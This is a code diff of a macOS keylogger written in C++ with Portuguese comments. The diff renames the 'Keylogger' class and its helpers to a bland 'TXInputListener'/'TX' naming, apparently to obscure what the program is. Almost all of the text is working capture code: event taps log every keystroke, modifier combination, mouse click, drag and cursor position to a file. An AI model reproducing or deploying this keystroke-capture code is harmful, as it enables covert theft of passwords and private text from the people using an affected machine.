@@ -1,13 +1,13 @@
-#include "KSVInputListener.h"
-#include "KSVKeyboard.h"
-#include "KSVLogger.h"
-#include "KSVMouse.h"
-#include "KSVConfig.h"
+#include "TXInputListener.h"
+#include "TXKeyboard.h"
+#include "TXLogger.h"
+#include "TXMouse.h"
+#include "TXConfig.h"
 #include <iostream>
 
 // executa ao criar a thread
-void Keylogger::operator()() {
-    Logger *logger = Logger::instance();
+void TXInputListener::operator()() {
+    TXLogger *logger = TXLogger::instance();
 
 //    const char *header = "[[K] KEYLOGGER INITIALIZED]";
 //    logger->writeln(header);
@@ -26,8 +26,8 @@ void Keylogger::operator()() {
  * Registra o rastreador de eventos para o Teclado.
  * Todas teclas quando pressionadas (down e up)
  */
-void Keylogger::initializeKeyboardTracker() {
-    Logger *logger = Logger::instance();
+void TXInputListener::initializeKeyboardTracker() {
+    TXLogger *logger = TXLogger::instance();
 
     // Apenas ouvir os eventos, não modificar
     CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;
@@ -42,11 +42,11 @@ void Keylogger::initializeKeyboardTracker() {
 
     // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
     if (!keyboardEventTap) {
-        logger->writeln("[[ERROR] Cannot track Keyboard events!]");
-        logger->writeln("[Tracking Keyboard events: NO]");
+        logger->writeln("[[ERROR] Cannot track TXKeyboard events!]");
+        logger->writeln("[Tracking TXKeyboard events: NO]");
         exit(1);
     } else {
-        logger->writeln("[Tracking Keyboard events: YES]");
+        logger->writeln("[Tracking TXKeyboard events: YES]");
     }
 
     // Obtem a referência do loop de execução do programa
@@ -57,11 +57,11 @@ void Keylogger::initializeKeyboardTracker() {
 
 
 /**
- * Registra o rastreador de eventos para Mouse.
+ * Registra o rastreador de eventos para TXMouse.
  * Clique com Direito/Esquerdo  e  Arrastar
  */
-void Keylogger::initializeMouseTracker() {
-    Logger *logger = Logger::instance();
+void TXInputListener::initializeMouseTracker() {
+    TXLogger *logger = TXLogger::instance();
 
     // Apenas ouvir os eventos, não modificar **ainda**
     CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;
@@ -80,11 +80,11 @@ void Keylogger::initializeMouseTracker() {
 
     // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
     if (!mouseEventTap) {
-        logger->writeln("[[ERROR] Cannot track Mouse events!]");
-        logger->writeln("[Tracking Mouse events: NO]");
+        logger->writeln("[[ERROR] Cannot track TXMouse events!]");
+        logger->writeln("[Tracking TXMouse events: NO]");
         exit(1);
     } else {
-        logger->writeln("[Tracking Mouse events: YES]");
+        logger->writeln("[Tracking TXMouse events: YES]");
     }
 
     // Obtem a referência do loop de execução do programa
@@ -98,16 +98,10 @@ void Keylogger::initializeMouseTracker() {
 // -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
 // ------------------------------------------------------------------------------------------------------------------------------- \\
 
-// Estado de teclas modificadoras (shift, cmd, option, ... )
-// 0 = nada acontecendo, não se trata de uma tecla de função
-// 1 = a tecla esta pressionada e o próximo estado é o 2 (será solta)
-// 2 = a tecla não esta mais sendo pressionada e o próximo status é 0
-int MDFKeysState[KSV_MDF_MEMORY_ALLOCATION];
-
-bool isMDFReleased = true;
+// Indica que um bloco de grupo foi iniciado.
 bool MDFGroupInitialized = false;
 
-void loggerMDFKey(Logger *logger, const char *parsedKey) {
+void loggerMDFKey(TXLogger *logger, const char *parsedKey) {
     logger->write("[m:");
     logger->write(parsedKey);
     logger->write("]");
@@ -117,7 +111,7 @@ void loggerMDFKey(Logger *logger, const char *parsedKey) {
  * Cria o grupo de teclas modificadoras, combinado com teclas normais.
  * Tudo que for pressionado enquanto uma ou mais teclas modificadoras estiverem ativas, é gravado dentro do grupo.
  */
-void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRef event, const char *parsedKey, int keyCode, Logger *logger) {
+void TXInputListener::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRef event, const char *parsedKey, int keyCode, TXLogger *logger) {
 
     CGEventFlags flag = CGEventGetFlags(event);
 
@@ -127,7 +121,8 @@ void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRe
         // Grupo não iniciado
         if (!MDFGroupInitialized) {
 
-            Logger::instance()->blockNewLineOnGroups = 1;
+            // Bloqueia as quebras de linha \n de writeln
+            TXLogger::instance()->blockNewLineOnGroups = 1;
 
             // Inicia o grupo
             logger->write("[{");
@@ -145,17 +140,14 @@ void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRe
         }
     } else {
 
-        Logger::instance()->blockNewLineOnGroups = 0;
+        // Libera as quebras de linha
+        TXLogger::instance()->blockNewLineOnGroups = 0;
 
         // Grava a ultima tecla MDF
         loggerMDFKey(logger, parsedKey);
 
         // Fecha o grupo
-        if(Logger::instance()->blockNewLineOnGroups) {
-            logger->write("}]");
-        }else{
-            logger->writeln("}]");
-        }
+        logger->writeln("}]");
 
         // Finaliza o identificador de grupo, para reabrir na proxima combinação MDF
         MDFGroupInitialized = false;
@@ -167,15 +159,15 @@ void Keylogger::CGKeyboardModifierInputEventCallback(CGEventType type, CGEventRe
 /**
  * Registra no arquivo de log a tecla pressionada
  */
-CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    Logger *logger = Logger::instance();
+CGEventRef TXInputListener::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+    TXLogger *logger = TXLogger::instance();
 
     // Obtem a tecla pressionada
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
     int64_t isInAutoRepeat = CGEventGetIntegerValueField(event, kCGKeyboardEventAutorepeat);
 
-    const char *parsedKey = Keyboard::convertKeyCode(keyCode);
-    bool isFnKey = Keyboard::isMDFKey(keyCode);
+    const char *parsedKey = TXKeyboard::convertKeyCode(keyCode);
+    bool isFnKey = TXKeyboard::isMDFKey(keyCode);
 
     // Se for uma tecla de função, a variavel [fnKeyActive] começara a ganhar alterações de status
     if (isFnKey) {
@@ -193,11 +185,7 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
             logger->write(parsedKey);
         }
 
-        if(Logger::instance()->blockNewLineOnGroups) {
-            logger->writeln("]");
-        }else{
-            logger->write("]");
-        }
+        logger->writeln("]");
     }
 
     return event;
@@ -215,14 +203,14 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
 bool is_dragging = false;
 char *clickOnDragStart = (char *) malloc(15);
 
-CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    Logger *logger = Logger::instance();
+CGEventRef TXInputListener::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+    TXLogger *logger = TXLogger::instance();
 
     // Obtem as cordenadas do mouse
-    CGPoint cursor = Mouse::getCursorPosition();
+    CGPoint cursor = TXMouse::getCursorPosition();
 
     // Prepara a string com o nome do botão do mouse que foi usado
-    const char *parsedMouseEvent = Mouse::convertMouseEvent(type);
+    const char *parsedMouseEvent = TXMouse::convertMouseEvent(type);
 
     // Se estiver CLICANDO e ARRASTANDO o mouse.
     if (type == kCGEventLeftMouseDragged || type == kCGEventRightMouseDragged || type == kCGEventOtherMouseDragged) {
@@ -256,9 +244,7 @@ CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventTy
             logger->write(clickOnDragStart);
             logger->write("]");
 
-            if(!Logger::instance()->blockNewLineOnGroups) {
-                logger->writeln("");
-            }
+            logger->writeln("");
 
             // Resetamos a variavel de controle do DRAG.
             is_dragging = false;
@@ -278,11 +264,7 @@ CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventTy
         logger->write((float) cursor.y);
         logger->write(parsedMouseEvent);
 
-        if(Logger::instance()->blockNewLineOnGroups) {
-            logger->write("]");
-        }else{
-            logger->writeln("]");
-        }
+        logger->writeln("]");
     }
 
     return event;
